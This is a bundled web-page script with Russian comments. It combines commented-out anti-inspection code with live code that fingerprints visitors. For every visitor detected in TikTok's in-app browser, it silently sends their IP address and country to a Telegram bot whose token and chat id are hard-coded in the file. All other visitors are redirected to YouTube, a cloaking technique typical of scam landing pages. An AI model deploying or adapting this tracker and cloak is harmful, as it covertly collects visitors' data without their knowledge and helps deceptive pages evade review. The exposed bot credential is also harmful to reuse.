(function() {
    // // === Secure.js ===
    // // Prevent right click
    // document.addEventListener('contextmenu', function(e) {
    //     e.preventDefault();
    //     return false;
    // });

    // // Prevent keyboard shortcuts
    // document.addEventListener('keydown', function(e) {
    //     // Prevent F12
    //     if (e.key === 'F12' || e.keyCode === 123) {
    //         e.preventDefault();
    //         return false;
    //     }
        
    //     // Prevent Ctrl+Shift+I/J/C/U
    //     if (e.ctrlKey && e.shiftKey && (
    //         e.key === 'I' || 
    //         e.key === 'i' || 
    //         e.key === 'J' || 
    //         e.key === 'j' || 
    //         e.key === 'C' || 
    //         e.key === 'c' ||
    //         e.key === 'U' ||
    //         e.key === 'u'
    //     )) {
    //         e.preventDefault();
    //         return false;
    //     }

    //     // Prevent Ctrl+U
    //     if (e.ctrlKey && (e.key === 'U' || e.key === 'u')) {
    //         e.preventDefault();
    //         return false;
    //     }
    // });

    // // Detect DevTools opening
    // let devtools = function() {};
    // devtools.toString = function() {
    //     detectDevTools();
    //     return '';
    // };

    // // Regular check for devtools
    // setInterval(function() {
    //     console.log(devtools);
    //     console.clear();
    // }, 100);

    // function detectDevTools() {
    //     if (window.devtools.isOpen || window.Firebug?.chrome?.isInitialized) {
    //         document.body.innerHTML = '';
    //         window.location.replace('about:blank');
    //     }
    // }

    // // Prevent stopping page load
    // let loaded = false;
    // window.addEventListener('load', function() {
    //     loaded = true;
    // });

    // // Check if page load was interrupted
    // setInterval(function() {
    //     if (!loaded) {
    //         window.stop();
    //         window.location.reload(true);
    //     }
    // }, 100);

    // // Disable source view
    // document.addEventListener('keydown', function(e) {
    //     if (e.ctrlKey && e.key === 'u') {
    //         e.preventDefault();
    //         return false;
    //     }
    // });

    // // Prevent copy/paste
    // document.addEventListener('copy', function(e) {
    //     e.preventDefault();
    //     return false;
    // });
    
    // document.addEventListener('paste', function(e) {
    //     e.preventDefault();
    //     return false;
    // });

    // // Clear console on open
    // console.clear();
    
    // // Override common debugging functions
    // const noop = () => {};
    // ['debug', 'info', 'log', 'warn', 'error'].forEach(function(method) {
    //     console[method] = noop;
    // });

    // // CSS protection
    // const style = document.createElement('style');
    // style.textContent = `
    //     body * {
    //         user-select: none !important;
    //         -webkit-user-select: none !important;
    //         -moz-user-select: none !important;
    //         -ms-user-select: none !important;
    //     }
    // `;
    // document.head.appendChild(style);



    // === Tg-otbiv.js ===
// Функция для получения эмодзи флага по коду страны
function getCountryFlagEmoji(countryCode) {
    // Коды стран и соответствующие эмодзи
    const countryFlags = {
        'UA': '🇺🇦', // Украина
        'US': '🇺🇸', // США
        'RU': '🇷🇺', // Россия
        'DE': '🇩🇪', // Германия
        'FR': '🇫🇷', // Франция
        'GB': '🇬🇧', // Великобритания
        'CN': '🇨🇳', // Китай
        'JP': '🇯🇵', // Япония
        'IN': '🇮🇳', // Индия
        'BR': '🇧🇷', // Бразилия
        // Добавьте другие страны по необходимости
    };

    // Возвращаем эмодзи флага или код страны, если флаг не найден
    return countryFlags[countryCode] || countryCode;
}

async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Ошибка при получении данных IP:', error);
        return null;
    }
}

async function sendToTelegram(message) {
    const chatId = "-4610081050";
    const botToken = "7493763616:AAFi0MZpHax9ALjz97knaYEf9UOobjRmN2Q";
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });
        const data = await response.json();
        console.log('Сообщение отправлено:', data);
    } catch (error) {
        console.error('Ошибка при отправке сообщения в Telegram:', error);
    }
}

async function main() {
    const ipInfo = await getIPInfo();
    if (ipInfo) {
        const countryFlag = getCountryFlagEmoji(ipInfo.country);
        const message = `Новое посещение🥳\n🌍 Страна: ${countryFlag} ${ipInfo.country_name}\n📍 IP: ${ipInfo.ip}`;
        await sendToTelegram(message);
    }
}



    // === Dir.js ===
    function isTikTokBrowser() {
        try {
            const ua = navigator.userAgent.toLowerCase();
            
            // Check UserAgent for TikTok indicators
            const ttUaChecks = [
                'tiktok',
                'musical_ly',
                'byte_dance',
                'bytedance',
                'toutiao'
            ].some(keyword => ua.includes(keyword));
            
            if (ttUaChecks) return true;
            
            // Check window properties specific to TikTok
            const ttPropertyChecks = [
                typeof window.TikTokJSBridge !== 'undefined',
                typeof window.webkit?.messageHandlers?.getTTWebId !== 'undefined',
                typeof window.ttBridge !== 'undefined',
                'tt_webid' in window,
                'ttBridge' in window
            ].some(Boolean);
            
            if (ttPropertyChecks) return true;
            
            // Check platform specific properties
            const platformChecks = [
                navigator.platform === 'iPhone' && ua.includes('tiktok'),
                navigator.platform === 'Android' && ua.includes('tiktok')
            ].some(Boolean);
            
            if (platformChecks) return true;

            // Additional fingerprint checks
            const fingerprintChecks = [
                document.referrer.includes('tiktok.com'),
                'ttfit' in window,
                'ttPixel' in window,
                localStorage.getItem('tt_webid')
            ].some(Boolean);
            
            return fingerprintChecks;

        } catch (e) {
            return false;
        }
    }

    // Execute immediately when script loads
    if (!isTikTokBrowser()) {
        window.location.replace('https://www.youtube.com/');
    } else {
        // Если браузер TikTok, запускаем отправку сообщения в Telegram
        main();
    }
})();